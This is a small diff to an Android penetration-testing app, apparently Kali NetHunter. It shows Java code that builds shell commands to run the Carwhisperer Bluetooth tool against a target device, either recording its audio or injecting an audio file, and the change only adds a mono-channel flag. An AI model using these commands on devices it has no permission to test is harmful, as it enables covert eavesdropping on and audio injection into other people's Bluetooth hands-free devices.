@@ -772,7 +772,7 @@ public class BTFragment extends Fragment {
                     if (selected_mode.equals("Listen")) {
                         intentClickListener_NH("echo -ne \"\\033]0;Listening BT audio\\007\" && clear;echo \"Carwhisperer starting..\nReturn to NetHunter to kill, or to listen live!\"$'\n';carwhisperer " + cw_iface + " /root/carwhisperer/in.raw /sdcard/rec.raw " + cw_target + " " + cw_channel + " && echo \"Converting to wav to target directory..\";sox -t raw -r 8000 -e signed -b 16 /sdcard/rec.raw -r 8000 -b 16 /sdcard/" + cw_listenfile + ";echo Done! || echo \"No convert file!\"");
                     } else if (selected_mode.equals("Inject")) {
-                        intentClickListener_NH("echo -ne \"\\033]0;Injecting BT audio\\007\" && clear;echo \"Carwhisperer starting..\";length=$(($(soxi -D " + cw_injectfile + " | cut -d. -f1)+8));sox " + cw_injectfile + " -r 8000 -b 16 tempi.raw && timeout $length " +
+                        intentClickListener_NH("echo -ne \"\\033]0;Injecting BT audio\\007\" && clear;echo \"Carwhisperer starting..\";length=$(($(soxi -D " + cw_injectfile + " | cut -d. -f1)+8));sox " + cw_injectfile + " -r 8000 -b 16 -c 1 tempi.raw && timeout $length " +
                                 "carwhisperer " + cw_iface + " tempi.raw tempo.raw " + cw_target + " " + cw_channel + "; rm tempi.raw && rm tempo.raw;echo \"\nInjection done, closing in 3 secs..\";sleep 3 && exit");
                     }
                 } else
